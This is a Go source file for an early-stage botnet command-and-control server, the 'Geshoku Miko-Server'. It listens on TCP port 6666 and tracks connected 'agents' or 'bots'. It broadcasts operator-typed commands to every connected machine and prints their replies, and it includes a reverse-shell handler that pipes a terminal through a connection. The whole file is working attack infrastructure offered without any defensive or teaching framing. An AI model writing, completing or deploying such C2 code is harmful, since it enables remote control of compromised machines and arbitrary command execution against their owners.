package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"sync"
)

var agent_list = make(map[string]net.Conn)
var lock = &sync.Mutex{}

func write_welcome() {
	fmt.Println("-----------Geshoku------------")
	fmt.Println("--------Miko-Server-----------")
	fmt.Println("------Version 0.001 Alpha-----")
	fmt.Println("------------------------------")
}

func rev_shell(conn net.Conn) {
	defer conn.Close()
	fmt.Println("[Info] Client connected:", conn.RemoteAddr())
	fmt.Println("[Info] Waiting for commands to send to the client")
	go io.Copy(conn, os.Stdin)
	fmt.Println("test")
	io.Copy(os.Stdout, conn)
}

func handle_client(conn net.Conn) {
	defer conn.Close()
	buffer := make([]byte, 1024)
	lock.Lock()
	agentID := conn.RemoteAddr().String()
	agent_list[agentID] = conn
	lock.Unlock()

	fmt.Printf("\n[Info] New agent connected: %s\n", agentID)
	for {
		//buffer = buffer[:0]
		_, err := conn.Read(buffer)
		if err != nil {
			fmt.Println("[Info] Agent disconnected")
			lock.Lock()
			delete(agent_list, agentID)
			lock.Unlock()
			return

		}
		fmt.Printf("[Info] %s : %s\n", agentID, buffer)
	}
}

func send_orders() {
	reader := bufio.NewReader(os.Stdin)
	noBotsMsg := false
	for {
		lock.Lock()
		if len(agent_list) == 0 {
			if !noBotsMsg {
				fmt.Println("[Info] No bots available, waiting...")
				noBotsMsg = true
			}
			lock.Unlock()
			continue
		}
		lock.Unlock()
		fmt.Print("Command> ") //Asks for commands at the start of the program before bots are even connected, add checker to ensure bots are connected
		command, _ := reader.ReadString('\n')
		lock.Lock()
		for id, conn := range agent_list {
			_, err := conn.Write([]byte(command))
			if err != nil {
				fmt.Printf("[Err] Failed to send command to %s: %v\n", id, err)
			}
		}
		lock.Unlock()
	}

}

func start_server() {
	listener, err := net.Listen("tcp", ":6666")
	if err != nil {
		fmt.Println("[Err] Server start failed: ", err)
		return
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("[Err] Connection accept failed: ", err)
			continue
		}
		go handle_client(conn)
	}
}

func main() {
	write_welcome()
	go start_server()
	send_orders()
}
